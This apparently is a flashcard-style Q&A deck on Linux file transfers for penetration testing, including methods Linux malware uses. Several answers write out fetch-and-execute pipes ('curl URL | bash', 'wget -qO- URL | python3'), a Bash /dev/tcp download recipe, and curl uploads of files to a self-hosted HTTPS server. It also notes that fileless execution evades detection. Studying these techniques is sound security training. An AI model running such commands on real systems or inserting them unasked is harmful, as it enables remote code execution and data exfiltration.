What are the three most common HTTP download methods used by Linux malware? | cURL, wget, and Python
What command encodes a file to base64 in a single line? | cat filename | base64 -w 0;echo
How do you decode a base64 string back to a file in Linux? | echo -n 'base64string' | base64 -d > filename
What is the wget command syntax to download a file with a specific output filename? | wget URL -O /path/to/output/filename
What is the cURL command syntax to download a file with a specific output filename? | curl -o /path/to/output/filename URL
How can you execute a downloaded script directly without saving it to disk using cURL? | curl URL | bash
How can you execute a downloaded Python script directly without saving it using wget? | wget -qO- URL | python3
What Bash feature allows file downloads when traditional tools are unavailable? | /dev/tcp device file (requires Bash 2.04+ with --enable-net-redirections)
What are the three steps to download a file using Bash's /dev/tcp? | 1. exec 3<>/dev/tcp/IP/PORT 2. echo -e "GET /file HTTP/1.1\n\n">&3 3. cat <&3
What is the SCP command syntax to download a file from a remote server? | scp user@remote_ip:/path/to/file /local/path/
What is the SCP command syntax to upload a file to a remote server? | scp /local/path/file user@remote_ip:/remote/path/
What command starts an SSH server on Linux? | sudo systemctl start ssh
What command enables SSH server to start automatically on boot? | sudo systemctl enable ssh
How do you check if SSH is listening on port 22? | netstat -lnpt
What Python module can be used to create a web server with file upload capability? | uploadserver
How do you install the uploadserver module? | sudo python3 -m pip install --user uploadserver
What command creates a self-signed certificate for HTTPS? | openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
How do you start an uploadserver with HTTPS on port 443? | sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
What cURL command uploads multiple files to an uploadserver? | curl -X POST https://IP/upload -F 'files=@/file1' -F 'files=@/file2' --insecure
How do you start a simple HTTP server using Python 3? | python3 -m http.server
How do you start a simple HTTP server using Python 2.7? | python2.7 -m SimpleHTTPServer
How do you start a simple HTTP server using PHP? | php -S 0.0.0.0:8000
How do you start a simple HTTP server using Ruby? | ruby -run -ehttpd . -p8000
What command verifies file integrity after transfer? | md5sum filename
What is the main advantage of fileless attacks in Linux? | They don't write files to disk during execution, making them harder to detect
What protocol do most malware variants use for communication regardless of operating system? | HTTP and HTTPS
What are the default ports for the web servers created by Python's http.server module? | Port 8000
Why might you create a temporary user account for file transfers? | To avoid using primary credentials or keys on a remote computer
What should you consider when starting a web server for file transfers? | Inbound traffic may be blocked by firewalls
